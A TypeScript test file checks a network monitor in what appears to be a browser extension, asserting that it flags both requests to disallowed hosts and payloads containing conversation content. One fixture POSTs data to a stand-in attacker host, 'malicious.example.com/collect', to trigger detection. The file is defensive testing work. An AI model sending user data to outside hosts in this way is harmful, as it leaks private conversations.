import assert from 'node:assert/strict';

import { createNetworkMonitor } from '@/background/monitoring/networkMonitor';
import type { NetworkMonitorIncident } from '@/shared/types/monitoring';

async function run() {
  const originalFetch = globalThis.fetch;
  const incidents: NetworkMonitorIncident[] = [];
  const stubFetch: typeof fetch = async () => new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });

  const monitor = createNetworkMonitor({
    allowedHosts: ['chat.openai.com'],
    sensitivePatterns: [/"content"/i],
    fetchImplementation: stubFetch,
    onIncident: (incident) => {
      incidents.push(incident);
    }
  });

  monitor.install();

  try {
    await fetch('https://chat.openai.com/api/messages', {
      method: 'POST',
      body: JSON.stringify({ message: 'hello world' })
    });
    assert.equal(incidents.length, 0);

    await fetch('https://malicious.example.com/collect', {
      method: 'POST',
      body: JSON.stringify({ message: 'should not be sent' })
    });
    assert.equal(incidents.length, 1);
    assert.equal(incidents[0]?.reason, 'disallowed_host');

    await fetch('https://chat.openai.com/api/messages', {
      method: 'POST',
      body: JSON.stringify({
        content: 'This payload contains conversation content that should be flagged by the monitor because it is lengthy and includes keywords.'
      })
    });
    assert.equal(incidents.length, 2);
    assert.equal(incidents[1]?.reason, 'payload_match');
    assert.ok(incidents[1]?.matchedPattern);
    assert.ok(incidents[1]?.payloadSnippet);

    const snapshot = monitor.getIncidents();
    assert.equal(snapshot.length, incidents.length);
  } finally {
    monitor.teardown();
    if (originalFetch) {
      (globalThis as typeof globalThis & { fetch: typeof fetch }).fetch = originalFetch;
    }
  }

  console.log('✓ network monitor incidents captured');
}

await run();
